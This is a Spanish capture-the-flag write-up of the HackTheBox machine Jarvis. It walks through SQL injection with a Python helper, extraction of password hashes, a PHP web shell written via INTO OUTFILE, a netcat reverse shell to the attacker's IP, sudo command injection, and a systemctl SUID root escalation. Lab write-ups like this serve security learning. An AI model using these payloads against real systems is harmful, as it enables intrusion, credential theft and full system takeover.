---
layout: single
title:  "Jarvis HTB"
categories: [ctf, sqli, htb]
---

## Jarvis writeup (SPANISH)
![asd](/assets/htb/jarvis/logo.png  ) 

### Descripcion de la maquina

|                   |                 |
|-------------------|-----------------|
| Jarvis         | [HTB Jarvis](https://app.hackthebox.com/machines/194) |
| Guglia001          | [Guglia001](https://app.hackthebox.com/profile/112776)     |
|        IP        | 10.10.10.143
| 					Dificultad					|<span style="color:orange">Medium</span>

Máquina en la que vamos a hacer una inyección sql manual con la ayuda de un script de python que hace una consola interactiva para que sea más fácil hacer los request. Despues obtenemos permisos de usuario gracias a una mala configuracion del sudo que nos permitira hacer Command injection en un script y luego ganamos privilegios de root creando y habilitando un servicio

# Enumeracion 
Hacemos primero un escaneo rápido para ver que puertos tiene abiertos para luego escanearlos <br>
`` nmap -p- -sV --open -oG allPorts --min-rate 5000 -vv -Pn -n  10.10.10.143 ``
```
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
64999/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
 ```

 `` nmap -sCV -Pn -oN nmap -p 22,80,64999 10.10.10.143 ``

 ```
 PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```

# Web Foothold
Tenemos 2 puertos web escaneamos el **80**  
Procedemos a buscar directorios en la web haciéndole fuerza bruta: <br>
`` wfuzz -c --hc=404 -t 500 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.143/FUZZ ``

``` 
Target: http://10.10.10.143/FUZZ
Total requests: 220547
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================
000000003:   301        9 L      28 W       313 Ch      "images"                                                                                                                                                                  
000000001:   200        543 L    1653 W     23628 Ch    "http://10.10.10.143"                                                                                                                                                    
000000537:   301        9 L      28 W       310 Ch      "css"                                                                                                                                                                     
000000940:   301        9 L      28 W       309 Ch      "js"                                                                                                                                                                      
000002758:   301        9 L      28 W       312 Ch      "fonts"                                                                                                                                                                   
000010812:   301        9 L      28 W       317 Ch      "phpmyadmin"                                                                                                                                                              
000045227:   200        543 L    1653 W     23628 Ch    "http://10.10.10.143/"                                                                                                                                                    
000086601:   301        9 L      28 W       311 Ch      "sass"
```

Es la web de un hotel que no es funcional 
![asd](/assets/htb/jarvis/principal.png  ) 

Escaneamos la página para reservar una habitación
![asd](/assets/htb/jarvis/rooms.png  ) 
En la que tenemos algo mas que obvio una inyeccion sqli
![asd](/assets/htb/jarvis/room.png  )  
Procedemos con la inyección , no hace falta hacer un error con **'**.
simplemente, empezamos con el query.. Intentamos ver cuantas columnas existen
en la tabla que estamos actualmente 
`` 1 ORDER BY 1 ``
![asd](/assets/htb/jarvis/order1.png  ) 
Añadimos un número al entero hasta que nos devuelva las tablas que tenemos 
`` 1 ORDER BY 8``
![asd](/assets/htb/jarvis/order8.png  ) 
Tenemos 8 columnas hacemos un UNION SELECT para ver si tenemos control de la query 

![asd](/assets/htb/jarvis/unionselect.png ) 

Como podemos ver los 1,2,3,4,5 se imprimen en los datos para reservar habitación <br>
[http://10.10.10.143/room.php?cod=0%20UNION%20SELECT%201,Database(),3,4,Version(),6,7](http://10.10.10.143/room.php?cod=0%20UNION%20SELECT%201,Database(),3,4,Version(),6,7).


![asd](/assets/htb/jarvis/info.png ) 

Procedemos a la creación de un script en python para hacer una consola interactiva a la hora de hacer los request para que sea más fácil y cómodo 

{% highlight python %}
{% raw %}

#!/usr/bin/python3 
from bs4 import BeautifulSoup
import requests
import re
import sys

#Variables globales
sqli_url = 'http://10.10.10.143/room.php?cod=0 '

def inyectar(parm, param2 = ""):
    data = ('UNION SELECT 1,%s,3,4,5,6,7 %s') % (param, param2 ) # Preparamos el request
    r = requests.get(sqli_url + data)                   
    soup = BeautifulSoup(r.text, 'html.parser') 

    print (soup.find('a',{'href':'/room.php?cod=1'}).text)      #Limpiamos y imprimimos la data que nos importa

if __name__ == '__main__':
    
    while True:
       param, param2 = input("[!] Payload: ").split(" ", 1)   #dejar 2 espacios al final del query
       if param != "exit":
           inyectar(param,param2)       
       else:
           sys.exit(1)
           
{% endraw %}
{% endhighlight %}

![asd](/assets/htb/jarvis/interact1.png ) 

`` load_file("/etc/passwd") ``
![asd](/assets/htb/jarvis/etcpasswd.png ) 

`` schema_name from information_schema.schemata limit 2,1 ``
![asd](/assets/htb/jarvis/schema.png )

Existe la tabla mysql, procedemos a obtener datos de ella <br>
`` user FROM mysql.user ``
``password FROM mysql.user ``
![asd](/assets/htb/jarvis/userpass.png )

## Reversing password
Con [Crackstation](https://crackstation.net/) podemos ver que la contrasena es **imissyou** 

## Reverse shell
Vemos si tenemos permiso de crear archivos <br>
[http://10.10.10.143/room.php?cod=-1%20UNION%20SELECT%201,%22prueba%22,3,4,5,6,7%20INTO%20OUTFILE%20%22/var/www/html/prueba.php%22](http://10.10.10.143/room.php?cod=-1%20UNION%20SELECT%201,%22prueba%22,3,4,5,6,7%20INTO%20OUTFILE%20%22/var/www/html/prueba.php%22)
![asd](/assets/htb/jarvis/salvadaarchivo.png )
![asd](/assets/htb/jarvis/salvadaarchivo2.png )

Creamos nuestro remote command execution para luego entablar una reverse shell

{% raw %}
system($_REQUEST['cmd'])
 INTO OUTFILE "/var/www/html/cmd.php"
{% endraw %}
[http://10.10.10.143/room.php?cod=-1%20UNION%20SELECT%201,%22%3C?php%20system($_REQUEST[%27cmd%27])%20?%3E%22,3,4,5,6,7%20INTO%20OUTFILE%20%22/var/www/html/cmd.php%22](http://10.10.10.143/room.php?cod=-1%20UNION%20SELECT%201,%22%3C?php%20system($_REQUEST[%27cmd%27])%20?%3E%22,3,4,5,6,7%20INTO%20OUTFILE%20%22/var/www/html/cmd.php%22)
![asd](/assets/htb/jarvis/whoa.png )

Nos ponemos en escucha con netcat en el puerto 3001

```bash
nc -lvp 3001 <br>
nc -c /bin/bash 10.10.14.18 3001
```


[http://10.10.10.143/cmd.php?cmd=nc -c /bin/bash 10.10.14.18 3001](http://10.10.10.143/cmd.php?cmd=nc -c /bin/bash 10.10.14.18 3001)


Hacemos tratamiento de la tty para poner nuestra shell interactiva [zsh](https://blog.mrtnrdl.de/infosec/2019/05/23/obtain-a-full-interactive-shell-with-zsh.html)


```bash
python -c 'import pty;pty.spawn("/bin/bash");'
ctrl + z
stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
stty raw -echo; fg
stty rows <ROWS> cols <COLS>
export TERM=xterm-256color
```

## User Privilege

**`sudo -l`**

```
www-data@jarvis:/var/www/html$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
www-data@jarvis:/var/www/html$ 

```

Se ejecuta un archivo como sudo si vemos el codigo nos damos cuenta de lo siguiente:
el script tiene una funcion para hacer ping a una ip, podemos inyectar comando facilmente porque no esta serialized 

```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```
 Primero creamos un archivo para hacer reverse shell <br>
 ```
  echo "nc -c /bin/bash 10.10.14.18 3001" > /tmp/rev.sh 
  sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
  $(bash /tmp/rev.sh) 
  ```

 ![asd](/assets/htb/jarvis/pepper.png )

## Privilege escalation

 Buscamos Binarios con permiso SUID
 `` find / -perm -u=s -type f 2>/dev/null `` 
  ![asd](/assets/htb/jarvis/SUID.png )

  Está el binario systemctl que se usa para iniciar o parar servicios existe un **poc** para escalar privilegios con esto [gtfobins](https://gtfobins.github.io/gtfobins/systemctl/)

  Creamos una configuración para que se habilite un servicio malicioso 

Archivo mario.service
```
[Unit]
Description=suid
User=root
[Service]
ExecStart=/home/pepper/root.sh
[Install]
WantedBy=multi-user.target

```

Archivo root.sh Lo que va a hacer es darle permiso SUID al bash para luego ejecutarla y nos arroje una terminal como root
```
#!/bin/bash
chmod u+s /bin/bash
```

![asd](/assets/htb/jarvis/bash_suid.png )

Ejecutamos **/bin/bash -p** para que nos arroje una terminal como el usuario root
![asd](/assets/htb/jarvis/flag.png )